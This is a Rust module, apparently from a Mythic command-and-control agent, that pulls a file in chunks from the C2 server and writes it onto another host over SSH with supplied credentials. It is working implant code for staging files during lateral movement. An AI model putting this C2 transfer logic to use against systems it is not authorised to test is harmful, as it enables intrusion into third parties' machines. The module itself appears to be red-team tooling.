use super::ssh_authenticate;
use crate::agent::{AgentTask, ContinuedData};
use crate::crypto::base64;
use crate::{mythic_continued, mythic_success};
use serde_json::json;
use std::error::Error;
use std::io::Write;
use std::path::Path;
use std::result::Result;
use std::sync::mpsc;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// Upload a file to a remote machine using SSH
/// * `task_id` - Id of the task
/// * `args` - Mythic arguments of the task
/// * `tx` - Channel for sending messages to Mythic
/// * `rx` - Channel for receiving messages from Mythic
pub fn upload_file(
    task_id: &str,
    args: &super::SshArgs,
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Get the file id for upload
    let file_id = args.upload.as_ref().unwrap();

    // Get the path to the file to upload
    let upload_path = args.upload_path.as_ref().unwrap();

    // Send the initial upload information to Mythic
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": file_id,
            "chunk_num": 1,
        }),
        "task_id": task_id,
    }))?;

    // Grab the new task arguments from Mythic
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

    // Base64 decode the initial file chunk
    let mut file_data: Vec<u8> = base64::decode(continued_args.chunk_data.unwrap())?;

    // Keep on downloading and decoding the file
    for chunk_num in 2..=continued_args.total_chunks.unwrap() {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

        file_data.append(&mut base64::decode(continued_args.chunk_data.unwrap())?);
    }

    // Notify Mythic that the agent received the file
    tx.send(mythic_continued!(
        task.id,
        "received",
        "Agent received file"
    ))?;

    let sess = ssh_authenticate(args)?;

    // Send over the downloaded file using scp
    let mut sender = sess.scp_send(
        Path::new(&upload_path),
        args.mode.unwrap(),
        file_data.len() as u64,
        None,
    )?;
    sender.write_all(&file_data)?;

    // Close the channel
    sender.send_eof()?;
    sender.wait_eof()?;
    sender.close()?;
    sender.wait_close()?;

    let mut output = mythic_success!(
        task.id,
        format!(
            "Uploaded file to {}@{}:{}",
            args.credentials.account, args.host, upload_path
        )
    );
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!(
            [
                {
                    "base_artifact": "Remote FileWrite",
                    "artifact": format!("ssh {}@{} -upload {}", args.credentials.account, args.host, upload_path)
                }
            ]
        )
    );

    // Notify Mythic that the file was uploaded
    tx.send(serde_json::to_value(output)?)?;

    Ok(())
}
